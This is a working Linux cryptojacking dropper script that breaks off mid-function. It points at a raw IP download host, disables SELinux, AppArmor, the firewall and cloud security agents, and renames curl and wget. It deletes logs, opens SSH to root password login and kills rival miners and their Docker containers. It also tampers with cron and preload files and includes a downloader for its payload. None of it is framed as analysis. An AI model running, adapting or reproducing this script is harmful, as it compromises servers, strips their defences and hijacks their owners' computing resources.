#!/bin/sh
sh_url1="http://103.209.103.16:26800/ff.sh"
sh_url2="http://103.209.103.16:26800/ff.sh"
xl_x64url1="http://103.209.103.16:26800/xlinux"
xl_x64url2="http://103.209.103.16:26800/xlinux"
xl_hash="39d373434c947742168e07cc9010c992"
xl_pathetc="/etc/iptablesupdate"

6

nameservercheck() {
	setenforce 0
	echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
chmod 777 /usr/bin/chattr
chmod 777 /bin/chattr
\cp -f /usr/bin/chattr /usr/bin/ttt
\cp -f /bin/chattr /bin/ttt
# mv -f /usr/bin/chattr /usr/bin/ttt


chattr -i /usr/bin/wget
chmod 777 /usr/bin/wget
chattr -i /bin/wget
chmod 777 /bin/wget

chattr -i /usr/bin/curl
chmod 777 /usr/bin/curl
chattr -i /bin/curl
chmod 777 /bin/curl

	# chattr -ia /usr/bin/curl
	# chattr -ia /usr/bin/wget
	# chattr -ia /usr/bin/cdt
	# chattr -ia /usr/bin/wdt
	mv -f /usr/bin/curl /usr/bin/cdt
	mv -f /usr/bin/url /usr/bin/cdt
	mv -f /usr/bin/cur /usr/bin/cdt
	mv -f /usr/bin/cdl /usr/bin/cdt
	mv -f /usr/bin/cd1 /usr/bin/cdt
	mv -f /usr/bin/wget /usr/bin/wdt
	mv -f /usr/bin/get /usr/bin/wdt
	mv -f /usr/bin/wge /usr/bin/wdt
	mv -f /usr/bin/wdl /usr/bin/wdt
	mv -f /usr/bin/wd1 /usr/bin/wdt

	mv -f /usr/bin/wgettnt /usr/bin/wdt
	mv -f /usr/bin/curltnt /usr/bin/cdt
	mv -f /usr/bin/wget1 /usr/bin/wdt
	mv -f /usr/bin/curl1 /usr/bin/cdt
	mv -f /usr/bin/xget /usr/bin/wdt

	# mv -f /usr/bin/cdt /usr/bin/curl
	# mv -f /usr/bin/wdt /usr/bin/wget

	rm -rf /var/log/syslog
	chattr -iau /tmp/
	chattr -iau /var/tmp/

	echo 128 > /proc/sys/vm/nr_hugepages
	sysctl -w vm.nr_hugepages=128

	echo "checking if name servers exist"
	cat /etc/resolv.conf | grep -e "nameserver 8.8.4.4" | grep -v grep
	if [ $? -eq 0 ]; then
		echo "already exists"
	else
		echo "8.8.4.4 does not exist...need to insert new line"
		#echo "nameserver 1.1.1.1" >> /etc/resolv.conf;
		chattr -ia /etc/resolv.conf
		sed -i '1s/^/nameserver 8.8.4.4\n/' /etc/resolv.conf
	fi

	cat /etc/resolv.conf | grep -e "nameserver 8.8.8.8" | grep -v grep
	if [ $? -eq 0 ]; then
		echo "already exists"
	else
		echo "8.8.8.8 does not exist...need to insert new line"
		#echo "nameserver 1.1.1.1" >> /etc/resolv.conf;
		chattr -ia /etc/resolv.conf
		sed -i '1s/^/nameserver 8.8.8.8\n/' /etc/resolv.conf
	fi
	echo "checking name servers exist"
}

installsoft() {
	yum install -y epel-release
if [ ! -f /usr/bin/tor ]
then
	yum install -y tor 2>/dev/null
	apt-get install tor -y 2>/dev/null		
fi

if [ ! -f /usr/bin/curl ] && [ ! -f /usr/bin/cdt ]
then
	yum install -y curl 2>/dev/null
	apt-get install curl -y 2>/dev/null
fi
	cat /etc/profile | grep -e "unset MAILCHECK" | grep -v grep
	if [ $? -eq 0 ]; then
		echo "already exists"
	else
		echo "does not exist...need to insert new line"
		echo "unset MAILCHECK">> /etc/profile
		source /etc/profile
	fi

}

sedsomestring(){
	chattr -ia /etc/ssh/sshd_config
	chmod 644 /etc/ssh/sshd_config
	sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
	sed -i 's/StrictModes yes/StrictModes no/' /etc/ssh/sshd_config
	sed -i 's/RSAAuthentication no/RSAAuthentication yes/' /etc/ssh/sshd_config
	sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
	sed -i 's/PubkeyAuthentication no/PubkeyAuthentication yes/' /etc/ssh/sshd_config
	sed -i -e 's/GSSAPIAuthentication yes/GSSAPIAuthentication no/g' /etc/ssh/sshd_config
# 
	sed -i 's/#PasswordAuthentication/PasswordAuthentication/' /etc/ssh/sshd_config
	sed -i 's/#StrictModes/StrictModes/' /etc/ssh/sshd_config
	sed -i 's/#RSAAuthentication/RSAAuthentication/' /etc/ssh/sshd_config
	sed -i 's/#PermitRootLogin/PermitRootLogin/' /etc/ssh/sshd_config
	sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/' /etc/ssh/sshd_config

	# sed -i -e 's/\#PermitRootLogin/PermitRootLogin/g' -e 's/\PermitRootLogin no/PermitRootLogin yes/g' -e 's/PermitRootLogin without-password/PermitRootLogin yes/g' -e 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
	chattr +ia /etc/ssh/sshd_config
}


kill_miner_proc()
{

ps aux | grep -v grep | grep -a -E ':3333|:5555|log_|systemten|netns|voltuned|/tmp/dl|/tmp/ddg|BtwXn5qH|3XEzey2T|t2tKrCSZ|C4iLM4L' | awk '{print $2}' | xargs -I % kill -9 %

ps aux | grep -v grep | grep -a -E '/tmp/pprt|IOFoqIgyC0zmf2UR|hahwNEdB|uiZvwxG8|AgdgACUD|I0r8Jyyt|PuNY5tm2|nMrfmnRa|aGTSGJJp|/tmp/jmx|/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %

ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'zzh' | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "stratum" | awk '{print $2}' | xargs -I % kill -9 %

pgrep -f monerohash | xargs -I % kill -9 %
pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
pgrep -f xzpauectgr | xargs -I % kill -9 %
pgrep -f slxfbkmxtd | xargs -I % kill -9 %
pgrep -f mixtape | xargs -I % kill -9 %
pgrep -f ./ppp | xargs -I % kill -9 %
pgrep -f cryptonight | xargs -I % kill -9 %
pgrep -f ./seervceaess | xargs -I % kill -9 %
pgrep -f ./servceaess | xargs -I % kill -9 %
pgrep -f ./servceas | xargs -I % kill -9 %
pgrep -f ./servcesa | xargs -I % kill -9 %
pgrep -f ./vsp | xargs -I % kill -9 %
pgrep -f ./jvs | xargs -I % kill -9 %
pgrep -f ./pvv | xargs -I % kill -9 %
pgrep -f ./vpp | xargs -I % kill -9 %
pgrep -f ./pces | xargs -I % kill -9 %
pgrep -f ./rspce | xargs -I % kill -9 %
pgrep -f ./haveged | xargs -I % kill -9 %
pgrep -f ./jiba | xargs -I % kill -9 %
pgrep -f ./watchbog | xargs -I % kill -9 %
pgrep -f ./A7mA5gb | xargs -I % kill -9 %
pgrep -f kacpi_svc | xargs -I % kill -9 %
pgrep -f kswap_svc | xargs -I % kill -9 %
pgrep -f kauditd_svc | xargs -I % kill -9 %
pgrep -f kpsmoused_svc | xargs -I % kill -9 %
pgrep -f kseriod_svc | xargs -I % kill -9 %
pgrep -f jmxx | xargs -I % kill -9 %
pgrep -f 2Ne80nA | xargs -I % kill -9 %
pgrep -f sysstats | xargs -I % kill -9 %
pgrep -f systemxlv | xargs -I % kill -9 %
pgrep -f watchbog | xargs -I % kill -9 %
pgrep -f OIcJi1m | xargs -I % kill -9 %

pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f XJnRj
pkill -f mgwsl
pkill -f pythno
pkill -f jweri
pkill -f lx26
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
pkill -f polkitd
pkill -f nanoWatch
pkill -f zigw
pkill -f devtool
pkill -f devtools
pkill -f systemctI
pkill -f watchbog
pkill -f cryptonight
pkill -f sustes
pkill -f xmrig
pkill -f xmrig-cpu
pkill -f init12.cfg
pkill -f nginxk
pkill -f tmp/wc.conf
pkill -f xmrig-notls
pkill -f xmr-stak
pkill -f suppoie
pkill -f zer0day.ru
pkill -f dbus-daemon--system
pkill -f nullcrew
pkill -f systemctI
pkill -f kworkerds
pkill -f init10.cfg
pkill -f /wl.conf
pkill -f crond64
pkill -f sustse
pkill -f vmlinuz
pkill -f exin
pkill -f apachiii
pkill -f networkmanager
pkill -f zzh

rm -rf /usr/bin/config.json
rm -rf /usr/bin/exin
rm -rf /tmp/wc.conf
rm -rf /tmp/log_rot
rm -rf /tmp/apachiii
rm -rf /tmp/sustse
rm -rf /tmp/php
rm -rf /tmp/p2.conf
rm -rf /tmp/pprt
rm -rf /tmp/ppol
rm -rf /tmp/javax/config.sh
rm -rf /tmp/javax/sshd2
rm -rf /tmp/.profile
rm -rf /tmp/1.so
rm -rf /tmp/kworkerds
rm -rf /tmp/kworkerds3
rm -rf /tmp/kworkerdssx
rm -rf /tmp/xd.json
rm -rf /tmp/syslogd
rm -rf /tmp/syslogdb
rm -rf /tmp/65ccEJ7
rm -rf /tmp/jmxx
rm -rf /tmp/2Ne80nA
rm -rf /tmp/dl
rm -rf /tmp/ddg
rm -rf /tmp/systemxlv
rm -rf /tmp/systemctI
rm -rf /tmp/.abc
rm -rf /tmp/osw.hb
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/.java
rm -rf /tmp/.omed
rm -rf /tmp/.tmpc
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/gates.lod
rm -rf /tmp/conf.n
rm -rf /tmp/devtool
rm -rf /tmp/devtools
rm -rf /tmp/fs
rm -rf /tmp/.rod
rm -rf /tmp/.rod.tgz
rm -rf /tmp/.rod.tgz.1
rm -rf /tmp/.rod.tgz.2
rm -rf /tmp/.mer
rm -rf /tmp/.mer.tgz
rm -rf /tmp/.mer.tgz.1
rm -rf /tmp/.hod
rm -rf /tmp/.hod.tgz
rm -rf /tmp/.hod.tgz.1
rm -rf /tmp/84Onmce
rm -rf /tmp/C4iLM4L
rm -rf /tmp/lilpip
rm -rf /tmp/3lmigMo
rm -rf /tmp/am8jmBP
rm -rf /tmp/tmp.txt
rm -rf /tmp/baby
rm -rf /tmp/.lib
rm -rf /tmp/systemd
rm -rf /tmp/lib.tar.gz
rm -rf /tmp/baby
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.mynews1234
rm -rf /tmp/a3e12d
rm -rf /tmp/.pt
rm -rf /tmp/.pt.tgz
rm -rf /tmp/.pt.tgz.1
rm -rf /tmp/go
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.tmpnewasss
rm -rf /tmp/java
rm -rf /tmp/go.sh
rm -rf /tmp/go2.sh
rm -rf /tmp/khugepageds
rm -rf /tmp/.censusqqqqqqqqq
rm -rf /tmp/.kerberods
rm -rf /tmp/kerberods
rm -rf /tmp/seasame
rm -rf /tmp/touch
rm -rf /tmp/.p
rm -rf /tmp/runtime2.sh
rm -rf /tmp/runtime.sh
rm -rf /dev/shm/z3.sh
rm -rf /dev/shm/z2.sh
rm -rf /dev/shm/.scr
rm -rf /dev/shm/.kerberods
chattr -i /etc/ld.so.preload
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
rm -rf /tmp/watchdogs
rm -rf /etc/cron.d/tomcat
rm -rf /etc/rc.d/init.d/watchdogs
rm -rf /usr/sbin/watchdogs
rm -rf /tmp/kthrotlds
rm -rf /etc/rc.d/init.d/kthrotlds
rm -rf /tmp/.sysbabyuuuuu12
rm -rf /tmp/logo9.jpg
rm -rf /tmp/miner.sh
rm -rf /tmp/nullcrew
rm -rf /tmp/proc
rm -rf /tmp/2.sh
rm -rf /opt/atlassian/confluence/bin/1.sh
rm -rf /opt/atlassian/confluence/bin/1.sh.1
rm -rf /opt/atlassian/confluence/bin/1.sh.2
rm -rf /opt/atlassian/confluence/bin/1.sh.3
rm -rf /opt/atlassian/confluence/bin/3.sh
rm -rf /opt/atlassian/confluence/bin/3.sh.1
rm -rf /opt/atlassian/confluence/bin/3.sh.2
rm -rf /opt/atlassian/confluence/bin/3.sh.3
rm -rf /var/tmp/f41
rm -rf /var/tmp/2.sh
rm -rf /var/tmp/config.json
rm -rf /var/tmp/xmrig
rm -rf /var/tmp/1.so
rm -rf /var/tmp/kworkerds3
rm -rf /var/tmp/kworkerdssx
rm -rf /var/tmp/kworkerds
rm -rf /var/tmp/wc.conf
rm -rf /var/tmp/nadezhda.
rm -rf /var/tmp/nadezhda.arm
rm -rf /var/tmp/nadezhda.arm.1
rm -rf /var/tmp/nadezhda.arm.2
rm -rf /var/tmp/nadezhda.x86_64
rm -rf /var/tmp/nadezhda.x86_64.1
rm -rf /var/tmp/nadezhda.x86_64.2
rm -rf /var/tmp/sustse3
rm -rf /var/tmp/sustse
rm -rf /var/tmp/moneroocean/
rm -rf /var/tmp/devtool
rm -rf /var/tmp/devtools
rm -rf /var/tmp/play.sh
rm -rf /var/tmp/systemctI
rm -rf /var/tmp/.java
rm -rf /var/tmp/1.sh
rm -rf /var/tmp/conf.n
rm -rf /var/tmp/lib
rm -rf /var/tmp/.lib


# rm -f /etc/rc*.d/K90* /etc/rc*.d/S90*
chkconfig network on
chattr +iau /etc/rc.d/init.d/
chattr -ia /lib/libudev.so.6
chattr -ia /lib/libudev.so
rm -f /lib/libudev.so
rm -f /lib/libudev.so.6
echo > /lib/libudev.so.6
echo > /lib/libudev.so
chattr +ia /lib/libudev.so.6
chattr +ia /lib/libudev.so
chattr -ia /etc/cron.hourly/gcc.sh
chattr -ia /etc/crontab
sed -i '/etc\/newinit.sh/d' /etc/crontab
chattr -ia /etc/newinit.sh
rm -f /etc/newinit.sh
sed -i '/gcc.sh/d' /etc/crontab
sed -i '/.work/work32/d' /etc/crontab
echo 1 > /etc/cron.hourly/gcc.sh
chattr +ia /etc/cron.hourly/gcc.sh
chattr +ia /etc/crontab


rm -rf /tmp/.X25-unix
rm -rf /tmp/.font-unix
rm -rf /tmp/.ICE-unix
rm -rf /tmp/.Test-unix
rm -rf /tmp/.X11-unix
rm -rf /tmp/.XIM-unix
rm -rf /tmp/.ice-unix
rm -rf /usr/.work/
ps aux | grep -v grep | grep -a -E '/tmp/secure.sh|/tmp/auth.sh|kswapd0|/tsm|/tmp/xmr' | awk '{print $2}' | xargs -I % kill -9 %


pkill -f kdevtmpfsi
rm -rf /tmp/kinsing
rm -rf /var/tmp/kinsing
chattr -iau /tmp/lok
chmod +700 /tmp/lok
rm -rf /tmp/lok
sleep 1
chattr -i /tmp/kdevtmpfsi
echo 1 > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi
sleep 1
chattr -i /tmp/redis2
echo 1 > /tmp/redis2
chattr +i /tmp/redis2
sleep 1
chattr -i /usr/lib/systemd/systemd-update-daily
echo 1 > /usr/lib/systemd/systemd-update-daily
chattr +i /usr/lib/systemd/systemd-update-daily
#yum install -y docker.io || apt-get install docker.io;

docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rm -f %
docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rm -f %
docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "patsissons/xmrig" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "lchaia/xmrig" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "cokkokotre1/update" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "challengerd/challengerd" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker rm -f %
docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "/bin/bash" | awk '{print $1}' | xargs -I % docker rm -f %



ufw disable
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis

	if ps aux | grep -i '[a]liyun'; then
		curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
		curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
		cdt http://update.aegis.aliyun.com/download/uninstall.sh | bash
		cdt http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash		
		pkill aliyun-service
		rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
		rm -rf /usr/local/aegis*
		systemctl stop aliyun.service
		systemctl disable aliyun.service
		service bcm-agent stop
		yum remove bcm-agent -y
		apt-get remove bcm-agent -y
	elif ps aux | grep -i '[y]unjing'; then
		/usr/local/qcloud/stargate/admin/uninstall.sh
		/usr/local/qcloud/YunJing/uninst.sh
		/usr/local/qcloud/monitor/barad/admin/uninstall.sh
	fi

if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor  
else
  export ARCH=amd64
  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} ]; then
    /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} stop && /usr/local/cloudmonitor/CmsGoAgent.linux-${ARCH} uninstall && rm -rf /usr/local/cloudmonitor 
  else
    echo "ali cloud monitor not running"
  fi
fi
}


kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
			echo `cat /proc/$procid/cmdline`
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline | grep -a -E "phpguard|newdat.sh|phpupdate|networkmanager"
                    if [ $? -ne 0 ]
                    then
                            # kill -9 $procid
							echo "kill id" $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=80.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline | grep -a -E "iptablesupdate|sh.sh"
            if [ $? -ne 0 ]
            then
                    # kill -9 $procid
					echo "kill id" $procid
            else
                    echo "don't kill"
					echo 
            fi
    done
}

downloads()
{
	echo $1, $2, $3
    if [ -f "/usr/bin/curl" ]
    then 
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
		echo curl $http_code $1
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 3 $1 > $2
        else
			echo http_code:$http_code $1 curl $http_code 
			http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $3`
			echo curl $http_code $3
			if [ "$http_code" -eq "200" ]
			then
				curl --connect-timeout 10 --retry 3 $3 > $2
			else
				echo http_code:$http_code $3 curl $http_code 
			fi
        fi


    elif [ -f "/usr/bin/cdt" ]
    then
        http_code=`cdt -I -m 10 -o /dev/null -s -w %{http_code} $1`
		echo cdt $http_code $1
        if [ "$http_code" -eq "200" ]
        then
            cdt --connect-timeout 10 --retry 3 $1 > $2
        else
			echo http_code:$http_code $1 cdt $http_code 
			http_code=`cdt -I -m 10 -o /dev/null -s -w %{http_code} $3`
			echo cdt $http_code $3
			if [ "$http_code" -eq "200" ]
			then
				cdt --connect-timeout 10 --retry 3 $3 > $2
			else
				echo http_code:$http_code $3 cdt $http_code 
			fi
        fi
    elif [ -f "/usr/bin/wget" ]
    then
		http_code=`wget --spider -S -T 2 $1 2>&1 | grep "^  HTTP/" | awk '{print $2}'`
		echo wget $http_code
		if [ "$http_code" -eq "200" ]
        then
			wget --timeout=10 --tries=10 -O $2 $1
		else
			echo http_code:$http_code $1 wget $http_code 
			http_code=`wget --spider -S -T 2 $3 2>&1 | grep "^  HTTP/" | awk '{print $2}'`
			if [ "$http_code" -eq "200" ]
			then
				wget --timeout=10 --tries=10 -O $2 $3
			else
				echo http_code:$http_code $3 wget $http_code 
			fi
		fi
    elif [ -f "/usr/bin/wdt" ]
    then
		http_code=`wdt --spider -S -T 2 $1 2>&1 | grep "^  HTTP/" | awk '{print $2}'`
		echo wdt $http_code
		if [ "$http_code" -eq "200" ]
        then
			wdt --timeout=10 --tries=10 -O $2 $1
		else
			echo http_code:$http_code $1 wdt $http_code 
			http_code=`wdt --spider -S -T 2 $3 2>&1 | grep "^  HTTP/" | awk '{print $2}'`
			if [ "$http_code" -eq "200" ]
			then
				wdt --timeout=10 --tries=10 -O $2 $3
			else
				echo http_code:$http_code $3 wdt $http_code 
			fi
		fi
    fi
}

removesshkeys() {
	cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3"
	if [ $? -eq 0 ]; then
		echo "key exists, removing."
		#ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3y2ZGo2pu2z7UT4F7tPsH1aWrjnXiSqgXHcDVjsXM/o93M+kfW5t6qs9z9cX4A4OVKr9UecXHAHhELa+5LSO59HaxLKMf/QBHVTqBlJkGo131MCnUOAonNQs0ldci5VpbDPBRKDB/U0drMt5VSiilLtssE2yRzV1SycnbEDH5F3vTHj+P0n/PZ8SKLt0YUXXV09eiSWjJl3gf1kf0PgvQbuLy1QhZ+YqS+wxSOfzt5n7BKn4WHObIZ53ZfWJyhx/C8thbjdZ72ipYuxDAvcWMfAAyvHLixoI9XnA9x/rkNB7dZHVyMdrmm++T8fZtZKLnGQ== rsa-key-20191213
		sudo chattr -ia /root/.ssh/authorized_keys
		sed -i 's/AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3/d' /root/.ssh/authorized_keys
